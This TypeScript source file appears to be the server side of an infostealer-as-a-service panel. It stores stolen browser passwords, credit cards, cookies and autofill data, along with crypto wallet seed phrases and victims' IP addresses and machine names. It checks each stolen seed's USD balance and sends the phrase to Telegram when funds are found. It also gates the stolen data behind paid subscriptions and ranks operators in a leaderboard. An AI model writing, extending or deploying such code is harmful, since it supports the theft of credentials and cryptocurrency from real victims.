import { db } from '../db/connection';
import { eq, and, desc, count, sql } from 'drizzle-orm';
import { browserSubmissions, filesearchSubmissions, walletSubmissions, users } from '../db/schema';
import Logger from '../utils/logger';
import { seed2usd } from '../utils/seed2usd';
import { TelegramService } from './telegram/telegramService';
import { LiveUpdateService } from './liveUpdateService';

/**
 * Filesearch submission payload
 */
export interface FilesearchSubmission {
  id: number;
  user_id: number;
  line: string;
  pattern: string;
  ip_address?: string;
  created_at: string;
}

/**
 * Wallet submission payload
 */
export interface WalletSubmission {
  id: number;
  user_id: number;
  wallet: string;
  mnemonic: string;
  balance_usd?: number;
  ip_address?: string;
  created_at: string;
}

export type SubmissionType = 'browser' | 'filesearch' | 'wallets';

export class SubmissionService {
  /**
   * Create a new submission in the appropriate table.
   * @param userId
   * @param type
   * @param data
   * @param filePath
   * @param fileName
   * @param ipAddress
   * @returns Promise<number>
   */
  public static async createSubmission(
    userId: number,
    type: SubmissionType,
    data?: string,
    filePath?: string,
    fileName?: string,
    ipAddress?: string,
  ): Promise<number> {
    if (type === 'browser') {
      // Parse browser data and insert per-data-type
      if (!data) throw new Error('No browser data provided');
      const parsed = JSON.parse(data);
      const browser = parsed.browser || 'Unknown';
      const desktop_name = parsed.desktop_name || null;
      const ip = ipAddress || parsed.ip || null;
      const user_id = userId;

      // Insert each array (passwords, autofill, credit_cards, cookies, history) as separate rows
      const types: Array<keyof typeof parsed> = [
        'passwords',
        'autofill',
        'credit_cards',
        'cookies',
        'history',
      ];
      let lastId = 0;
      for (const t of types) {
        if (Array.isArray(parsed[t]) && parsed[t].length > 0) {
          for (const entry of parsed[t]) {
            // Check for duplicate
            const existing = await db
              .select()
              .from(browserSubmissions)
              .where(eq(browserSubmissions.data, JSON.stringify(entry)))
              .limit(1);

            if (existing.length > 0) {
              continue; // Skip duplicate
            }

            // Insert new submission
            const result = await db
              .insert(browserSubmissions)
              .values({
                userId: user_id,
                browser,
                type: t as any,
                data: JSON.stringify(entry),
                desktopName: desktop_name,
                ipAddress: ip,
                createdAt: new Date(),
              })
              .returning({ id: browserSubmissions.id });

            lastId = result[0].id;

            // Broadcast live update for new browser data
            LiveUpdateService.broadcastNewSubmission(user_id, {
              id: lastId,
              type: 'browser',
              subtype: t,
              data: entry,
              browser,
              created_at: new Date().toISOString(),
            });
          }
        }
      }
      return lastId;
    }

    if (type === 'filesearch') {
      // Parse filesearch data and insert each result as a row, skipping duplicates by line
      if (!data) throw new Error('No filesearch data provided');
      const parsed = JSON.parse(data);
      const user_id = userId;
      const ip = ipAddress || null;
      if (!Array.isArray(parsed.data)) throw new Error('Invalid filesearch data');
      let lastId = 0;
      for (const entry of parsed.data) {
        // Check for duplicate (user_id, line)
        const existing = await db
          .select()
          .from(filesearchSubmissions)
          .where(
            and(
              eq(filesearchSubmissions.userId, user_id),
              eq(filesearchSubmissions.line, entry.line),
            ),
          )
          .limit(1);

        if (existing.length > 0) {
          continue; // Skip duplicate
        }

        let dataToSave = {};
        if (entry.pattern === 'mnemonicPhrase') {
          try {
            const balanceResult = await seed2usd(entry.line);
            dataToSave = { balance: balanceResult.totalUsdBalance };

            // Send Telegram notification for high-balance secrets
            if (balanceResult.totalUsdBalance > 0) {
              // Get username for notification
              try {
                const userResult = await db
                  .select({ username: users.username })
                  .from(users)
                  .where(eq(users.id, user_id))
                  .limit(1);

                if (userResult.length > 0) {
                  await TelegramService.notifyHighBalanceSecret(
                    userResult[0].username,
                    entry.pattern,
                    balanceResult.totalUsdBalance,
                    entry.line,
                  );
                }
              } catch (error) {
                Logger.error('Failed to send Telegram notification for high-balance secret', {
                  userId: user_id,
                  error: error instanceof Error ? error.message : String(error),
                });
              }
            }
          } catch {
            dataToSave = {};
          }
        }

        const result = await db
          .insert(filesearchSubmissions)
          .values({
            userId: user_id,
            line: entry.line,
            pattern: entry.pattern,
            data: JSON.stringify(dataToSave),
            ipAddress: ip,
            createdAt: new Date(),
          })
          .returning({ id: filesearchSubmissions.id });

        lastId = result[0].id;

        // Broadcast live update for new filesearch data
        LiveUpdateService.broadcastNewSubmission(user_id, {
          id: lastId,
          type: 'filesearch',
          data: {
            line: entry.line,
            pattern: entry.pattern,
            ...dataToSave,
          },
          created_at: new Date().toISOString(),
        });
      }
      return lastId;
    }

    if (type === 'wallets') {
      // Parse wallet data and insert
      if (!data && !filePath) throw new Error('No wallet data or file provided');
      let wallet = 'unknown';
      let mnemonic = '';
      let balance_usd: number | undefined = undefined;
      if (data) {
        const parsed = JSON.parse(data);
        wallet = parsed.xe_wallet || 'unknown';
        mnemonic = parsed.xe_mnemonic || '';
        if (typeof parsed.balance_usd === 'number') {
          balance_usd = parsed.balance_usd;
        }
      }
      // If file upload, just store file name as wallet, mnemonic as empty
      if (filePath && !data) {
        wallet = fileName || 'uploaded_file';
        mnemonic = '';
      }
      const user_id = userId;
      const ip = ipAddress || null;

      // Duplicate check by mnemonic (skip insert if exists)
      if (mnemonic) {
        const existing = await db
          .select()
          .from(walletSubmissions)
          .where(eq(walletSubmissions.mnemonic, mnemonic))
          .limit(1);

        if (existing.length > 0) {
          return 0; // Duplicate found, do not insert
        }
      }

      const result = await db
        .insert(walletSubmissions)
        .values({
          userId: user_id,
          wallet,
          mnemonic,
          balanceUsd: balance_usd ? String(balance_usd) : null,
          ipAddress: ip,
          createdAt: new Date(),
        })
        .returning({ id: walletSubmissions.id });

      const lastId = result[0].id;

      // Broadcast live update for new wallet data
      LiveUpdateService.broadcastNewSubmission(user_id, {
        id: lastId,
        type: 'wallets',
        data: {
          wallet,
          mnemonic,
          balance_usd: balance_usd || 0,
        },
        created_at: new Date().toISOString(),
      });

      // Send Telegram notification for new wallet
      if (wallet && mnemonic) {
        try {
          const userResult = await db
            .select({ username: users.username })
            .from(users)
            .where(eq(users.id, user_id))
            .limit(1);

          if (userResult.length > 0) {
            await TelegramService.notifyNewWallet(
              userResult[0].username,
              wallet,
              balance_usd || 0,
              mnemonic,
            );
          }
        } catch (error) {
          Logger.error('Failed to send Telegram notification for new wallet', {
            userId: user_id,
            error: error instanceof Error ? error.message : String(error),
          });
        }
      }

      return lastId;
    }

    throw new Error('Unsupported submission type');
  }

  /**
   * Get all submissions for a user, merged from all tables, sorted by created_at desc.
   * @param userId
   */
  static async getUserSubmissions(userId: number): Promise<any[]> {
    // Query all three tables and merge results
    const [browser, filesearch, wallets] = await Promise.all([
      // Browser submissions
      db
        .select({
          id: browserSubmissions.id,
          user_id: browserSubmissions.userId,
          submission_type: browserSubmissions.type,
          browser: browserSubmissions.browser,
          type: browserSubmissions.type,
          data: browserSubmissions.data,
          desktop_name: browserSubmissions.desktopName,
          ip_address: browserSubmissions.ipAddress,
          created_at: browserSubmissions.createdAt,
        })
        .from(browserSubmissions)
        .where(eq(browserSubmissions.userId, userId)),

      // Filesearch submissions
      db
        .select({
          id: filesearchSubmissions.id,
          user_id: filesearchSubmissions.userId,
          type: filesearchSubmissions.pattern,
          pattern: filesearchSubmissions.pattern,
          line: filesearchSubmissions.line,
          data: filesearchSubmissions.data,
          ip_address: filesearchSubmissions.ipAddress,
          created_at: filesearchSubmissions.createdAt,
        })
        .from(filesearchSubmissions)
        .where(eq(filesearchSubmissions.userId, userId)),

      // Wallet submissions
      db
        .select({
          id: walletSubmissions.id,
          user_id: walletSubmissions.userId,
          type: walletSubmissions.wallet,
          wallet: walletSubmissions.wallet,
          mnemonic: walletSubmissions.mnemonic,
          balance_usd: walletSubmissions.balanceUsd,
          ip_address: walletSubmissions.ipAddress,
          created_at: walletSubmissions.createdAt,
        })
        .from(walletSubmissions)
        .where(eq(walletSubmissions.userId, userId)),
    ]);

    // Map browser submissions to include submission_category
    const mappedBrowser = browser.map((row) => ({
      ...row,
      submission_category: 'browser',
    }));

    // Merge and sort by created_at desc
    return [...mappedBrowser, ...filesearch, ...wallets].sort(
      (a, b) => new Date(b.created_at || 0).getTime() - new Date(a.created_at || 0).getTime(),
    );
  }

  /**
   * Get all submissions (admin), merged from all tables, sorted by created_at desc.
   */
  static async getAllSubmissions(): Promise<any[]> {
    // Join with users for username
    const [browser, filesearch, wallets] = await Promise.all([
      // Browser submissions with user join
      db
        .select({
          id: browserSubmissions.id,
          user_id: browserSubmissions.userId,
          submission_type: browserSubmissions.type,
          browser: browserSubmissions.browser,
          type: browserSubmissions.type,
          data: browserSubmissions.data,
          desktop_name: browserSubmissions.desktopName,
          ip_address: browserSubmissions.ipAddress,
          created_at: browserSubmissions.createdAt,
          username: users.username,
        })
        .from(browserSubmissions)
        .leftJoin(users, eq(browserSubmissions.userId, users.id)),

      // Filesearch submissions with user join
      db
        .select({
          id: filesearchSubmissions.id,
          user_id: filesearchSubmissions.userId,
          type: filesearchSubmissions.pattern,
          pattern: filesearchSubmissions.pattern,
          line: filesearchSubmissions.line,
          ip_address: filesearchSubmissions.ipAddress,
          created_at: filesearchSubmissions.createdAt,
          username: users.username,
        })
        .from(filesearchSubmissions)
        .leftJoin(users, eq(filesearchSubmissions.userId, users.id)),

      // Wallet submissions with user join
      db
        .select({
          id: walletSubmissions.id,
          user_id: walletSubmissions.userId,
          type: walletSubmissions.wallet,
          wallet: walletSubmissions.wallet,
          mnemonic: walletSubmissions.mnemonic,
          balance_usd: walletSubmissions.balanceUsd,
          ip_address: walletSubmissions.ipAddress,
          created_at: walletSubmissions.createdAt,
          username: users.username,
        })
        .from(walletSubmissions)
        .leftJoin(users, eq(walletSubmissions.userId, users.id)),
    ]);

    // Map browser submissions to include submission_category
    const mappedBrowser = browser.map((row) => ({
      ...row,
      submission_category: 'browser',
    }));

    return [...mappedBrowser, ...filesearch, ...wallets].sort(
      (a, b) => new Date(b.created_at || 0).getTime() - new Date(a.created_at || 0).getTime(),
    );
  }

  /**
   * Get all submissions of a given type (admin).
   * @param type
   */
  static async getSubmissionsByType(type: SubmissionType): Promise<any[]> {
    if (type === 'browser') {
      return await db
        .select({
          id: browserSubmissions.id,
          user_id: browserSubmissions.userId,
          submission_type: browserSubmissions.type,
          browser: browserSubmissions.browser,
          type: browserSubmissions.type,
          data: browserSubmissions.data,
          desktop_name: browserSubmissions.desktopName,
          ip_address: browserSubmissions.ipAddress,
          created_at: browserSubmissions.createdAt,
          username: users.username,
        })
        .from(browserSubmissions)
        .leftJoin(users, eq(browserSubmissions.userId, users.id))
        .orderBy(desc(browserSubmissions.createdAt));
    }
    if (type === 'filesearch') {
      return await db
        .select({
          id: filesearchSubmissions.id,
          user_id: filesearchSubmissions.userId,
          type: filesearchSubmissions.pattern,
          pattern: filesearchSubmissions.pattern,
          line: filesearchSubmissions.line,
          ip_address: filesearchSubmissions.ipAddress,
          created_at: filesearchSubmissions.createdAt,
          username: users.username,
        })
        .from(filesearchSubmissions)
        .leftJoin(users, eq(filesearchSubmissions.userId, users.id))
        .orderBy(desc(filesearchSubmissions.createdAt));
    }
    if (type === 'wallets') {
      return await db
        .select({
          id: walletSubmissions.id,
          user_id: walletSubmissions.userId,
          type: walletSubmissions.wallet,
          wallet: walletSubmissions.wallet,
          mnemonic: walletSubmissions.mnemonic,
          balance_usd: walletSubmissions.balanceUsd,
          ip_address: walletSubmissions.ipAddress,
          created_at: walletSubmissions.createdAt,
          username: users.username,
        })
        .from(walletSubmissions)
        .leftJoin(users, eq(walletSubmissions.userId, users.id))
        .orderBy(desc(walletSubmissions.createdAt));
    }
    return [];
  }

  /**
   * Get submission stats for admin dashboard.
   */
  static async getSubmissionStats(): Promise<any> {
    // Count per type
    const [browser, filesearch, wallets, totalUsersResult] = await Promise.all([
      // Browser submissions count
      db
        .select({
          count: count(),
          unique_users: count(browserSubmissions.userId),
        })
        .from(browserSubmissions)
        .then((result) => ({
          type: 'browser',
          count: result[0].count,
          unique_users: result[0].unique_users,
        })),

      // Filesearch submissions count
      db
        .select({
          count: count(),
          unique_users: count(filesearchSubmissions.userId),
        })
        .from(filesearchSubmissions)
        .then((result) => ({
          type: 'filesearch',
          count: result[0].count,
          unique_users: result[0].unique_users,
        })),

      // Wallet submissions count
      db
        .select({
          count: count(),
          unique_users: count(walletSubmissions.userId),
        })
        .from(walletSubmissions)
        .then((result) => ({
          type: 'wallets',
          count: result[0].count,
          unique_users: result[0].unique_users,
        })),

      // Total users (non-admin)
      db
        .select({ total_users: count() })
        .from(users)
        .where(eq(users.isAdmin, false))
        .then((result) => result[0].total_users),
    ]);
    // Top submitters leaderboard (sum across all submission tables)
    // Get counts per user for each submission type
    const [browserCounts, filesearchCounts, walletCounts] = await Promise.all([
      db
        .select({
          userId: browserSubmissions.userId,
          count: count(),
        })
        .from(browserSubmissions)
        .groupBy(browserSubmissions.userId),

      db
        .select({
          userId: filesearchSubmissions.userId,
          count: count(),
        })
        .from(filesearchSubmissions)
        .groupBy(filesearchSubmissions.userId),

      db
        .select({
          userId: walletSubmissions.userId,
          count: count(),
        })
        .from(walletSubmissions)
        .groupBy(walletSubmissions.userId),
    ]);

    // Get all non-admin users
    const allUsers = await db
      .select({
        id: users.id,
        username: users.username,
      })
      .from(users)
      .where(eq(users.isAdmin, false));

    // Calculate totals for each user
    const userTotals = allUsers.map((user) => {
      const browserCount = browserCounts.find((c) => c.userId === user.id)?.count || 0;
      const filesearchCount = filesearchCounts.find((c) => c.userId === user.id)?.count || 0;
      const walletCount = walletCounts.find((c) => c.userId === user.id)?.count || 0;
      const totalSubmissions = browserCount + filesearchCount + walletCount;

      return {
        id: user.id,
        username: user.username,
        browser_count: browserCount,
        filesearch_count: filesearchCount,
        wallet_count: walletCount,
        total_submissions: totalSubmissions,
      };
    });

    // Sort by total submissions and take top 5
    const topSubmitters = userTotals
      .filter((user) => user.total_submissions > 0)
      .sort((a, b) => {
        if (b.total_submissions !== a.total_submissions) {
          return b.total_submissions - a.total_submissions;
        }
        return a.username.localeCompare(b.username);
      })
      .slice(0, 5);

    return {
      byType: [browser, filesearch, wallets],
      totalUsers: totalUsersResult,
      topSubmitters,
    };
  }

  /**
   * Get user submissions with subscription check.
   * @param userId
   */
  static async getUserSubmissionsWithSubscriptionCheck(userId: number): Promise<{
    browser?: any[];
    filesearch?: any[];
    wallets?: any[];
    browserStats?: { [key: string]: number };
    requiresSubscription?: boolean;
    message?: string;
  }> {
    // Import here to avoid circular dependency
    const { SubscriptionService } = await import('./subscriptionService');
    const hasActiveSubscription = await SubscriptionService.hasActiveSubscription(userId);
    if (!hasActiveSubscription) {
      return {
        requiresSubscription: true,
        message:
          'Active subscription required to view submissions. Please purchase a subscription.',
      };
    }
    const submissionsData = await getDashboardSubmissions(userId);
    return submissionsData;
  }
}

/**
 * Browser submission payload
 */
export interface BrowserSubmission {
  id: number;
  user_id: number;
  browser: string;
  type: string;
  data: object;
  desktop_name?: string;
  ip_address?: string;
  created_at: string;
  username?: string;
}

/**
 * Get all browser submissions for a user
 * @param userId
 */
export async function getBrowserSubmissions(userId: number): Promise<BrowserSubmission[]> {
  const rows = await db
    .select({
      id: browserSubmissions.id,
      user_id: browserSubmissions.userId,
      browser: browserSubmissions.browser,
      type: browserSubmissions.type,
      data: browserSubmissions.data,
      desktop_name: browserSubmissions.desktopName,
      ip_address: browserSubmissions.ipAddress,
      created_at: browserSubmissions.createdAt,
    })
    .from(browserSubmissions)
    .where(eq(browserSubmissions.userId, userId))
    .orderBy(desc(browserSubmissions.createdAt));

  // Parse the data JSON for each row
  const formattedRows = rows.map((row) => {
    const parsedData = safeParseJson(String(row.data));
    return {
      id: row.id,
      user_id: row.user_id,
      browser: row.browser,
      type: row.type, // This should be 'autofill', 'passwords', etc. from database
      data:
        typeof parsedData === 'object' && parsedData !== null ? parsedData : { value: parsedData },
      desktop_name: row.desktop_name,
      ip_address: row.ip_address,
      created_at: row.created_at?.toISOString() || '',
      username: undefined, // Not selected in this query
    };
  });

  return formattedRows as BrowserSubmission[];
}

/**
 * Get all browser submissions for all users (admin)
 */
export async function getBrowserSubmissionsAll(): Promise<BrowserSubmission[]> {
  const rows = await db
    .select({
      id: browserSubmissions.id,
      user_id: browserSubmissions.userId,
      browser: browserSubmissions.browser,
      type: browserSubmissions.type,
      data: browserSubmissions.data,
      desktop_name: browserSubmissions.desktopName,
      ip_address: browserSubmissions.ipAddress,
      created_at: browserSubmissions.createdAt,
      username: users.username,
    })
    .from(browserSubmissions)
    .leftJoin(users, eq(browserSubmissions.userId, users.id))
    .orderBy(desc(browserSubmissions.createdAt));

  const formattedRows = rows.map((row) => {
    const parsedData = safeParseJson(String(row.data));
    return {
      id: row.id,
      user_id: row.user_id,
      browser: row.browser,
      type: row.type, // This should be the actual type from database
      data:
        typeof parsedData === 'object' && parsedData !== null ? parsedData : { value: parsedData },
      desktop_name: row.desktop_name,
      ip_address: row.ip_address,
      created_at: row.created_at?.toISOString() || '',
      username: row.username,
    };
  });

  return formattedRows as BrowserSubmission[];
}

/**
 * Helper to safely parse JSON, fallback to string if invalid.
 */
function safeParseJson(str: string): object | string {
  try {
    return JSON.parse(str);
  } catch {
    return str;
  }
}

export interface DashboardFilesearch {
  id: number;
  user_id: number;
  pattern: string;
  line: string;
  data?: { balance?: number } | string;
  ip_address?: string;
  created_at: string;
  username?: string;
}

export interface DashboardSubmissions {
  browser: BrowserSubmission[];
  filesearch: DashboardFilesearch[];
  wallets: {
    id: number;
    user_id: number;
    wallet: string;
    mnemonic: string;
    balance_usd?: number;
    ip_address?: string;
    created_at: string;
    username?: string;
  }[];
}

/**
 * Get all submissions for a user
 * @param userId
 */
export async function getDashboardSubmissions(
  userId: number,
): Promise<DashboardSubmissions & { browserStats: { [key: string]: number } }> {
  // Browser
  const browser = await getBrowserSubmissions(userId);

  // Calculate browser stats by type
  const browserStats = browser.reduce(
    (stats, item) => {
      const type = item.type || 'unknown';
      stats[type] = (stats[type] || 0) + 1;
      return stats;
    },
    {} as { [key: string]: number },
  );

  // Filesearch (now includes parsed data)
  const filesearchRows = await db
    .select({
      id: filesearchSubmissions.id,
      user_id: filesearchSubmissions.userId,
      pattern: filesearchSubmissions.pattern,
      line: filesearchSubmissions.line,
      data: filesearchSubmissions.data,
      ip_address: filesearchSubmissions.ipAddress,
      created_at: filesearchSubmissions.createdAt,
    })
    .from(filesearchSubmissions)
    .where(eq(filesearchSubmissions.userId, userId))
    .orderBy(desc(filesearchSubmissions.createdAt));

  // Always parse data column for each row
  const filesearch = filesearchRows.map((row) => ({
    ...row,
    data: safeParseJson(String(row.data)),
    ip_address: row.ip_address || undefined,
    created_at: row.created_at?.toISOString() || '',
  }));

  // Wallets
  const wallets = await db
    .select({
      id: walletSubmissions.id,
      user_id: walletSubmissions.userId,
      wallet: walletSubmissions.wallet,
      mnemonic: walletSubmissions.mnemonic,
      balance_usd: walletSubmissions.balanceUsd,
      ip_address: walletSubmissions.ipAddress,
      created_at: walletSubmissions.createdAt,
    })
    .from(walletSubmissions)
    .where(eq(walletSubmissions.userId, userId))
    .orderBy(desc(walletSubmissions.createdAt));

  // Format wallets data
  const formattedWallets = wallets.map((wallet) => ({
    ...wallet,
    balance_usd: wallet.balance_usd ? parseFloat(wallet.balance_usd) : undefined,
    ip_address: wallet.ip_address || undefined,
    created_at: wallet.created_at?.toISOString() || '',
  }));

  return { browser, filesearch, wallets: formattedWallets, browserStats };
}

/**
 * Get all submissions for all users (admin)
 */
export async function getDashboardSubmissionsAll(): Promise<
  DashboardSubmissions & { browserStats: { [key: string]: number } }
> {
  // Browser
  const browser = await getBrowserSubmissionsAll();

  // Calculate browser stats by type
  const browserStats = browser.reduce(
    (stats, item) => {
      const type = item.type || 'unknown';
      stats[type] = (stats[type] || 0) + 1;
      return stats;
    },
    {} as { [key: string]: number },
  );

  // Filesearch (now includes parsed data)
  const filesearchRows = await db
    .select({
      id: filesearchSubmissions.id,
      user_id: filesearchSubmissions.userId,
      pattern: filesearchSubmissions.pattern,
      line: filesearchSubmissions.line,
      data: filesearchSubmissions.data,
      ip_address: filesearchSubmissions.ipAddress,
      created_at: filesearchSubmissions.createdAt,
      username: users.username,
    })
    .from(filesearchSubmissions)
    .leftJoin(users, eq(filesearchSubmissions.userId, users.id))
    .orderBy(desc(filesearchSubmissions.createdAt));

  // Always parse data column for each row
  const filesearch = filesearchRows.map((row) => ({
    ...row,
    data: safeParseJson(String(row.data)),
    ip_address: row.ip_address || undefined,
    created_at: row.created_at?.toISOString() || '',
    username: row.username || undefined,
  }));

  // Wallets
  const wallets = await db
    .select({
      id: walletSubmissions.id,
      user_id: walletSubmissions.userId,
      wallet: walletSubmissions.wallet,
      mnemonic: walletSubmissions.mnemonic,
      balance_usd: walletSubmissions.balanceUsd,
      ip_address: walletSubmissions.ipAddress,
      created_at: walletSubmissions.createdAt,
      username: users.username,
    })
    .from(walletSubmissions)
    .leftJoin(users, eq(walletSubmissions.userId, users.id))
    .orderBy(desc(walletSubmissions.createdAt));

  // Format wallets data
  const formattedWallets = wallets.map((wallet) => ({
    ...wallet,
    balance_usd: wallet.balance_usd ? parseFloat(wallet.balance_usd) : undefined,
    ip_address: wallet.ip_address || undefined,
    created_at: wallet.created_at?.toISOString() || '',
    username: wallet.username || undefined,
  }));

  return { browser, filesearch, wallets: formattedWallets, browserStats };
}
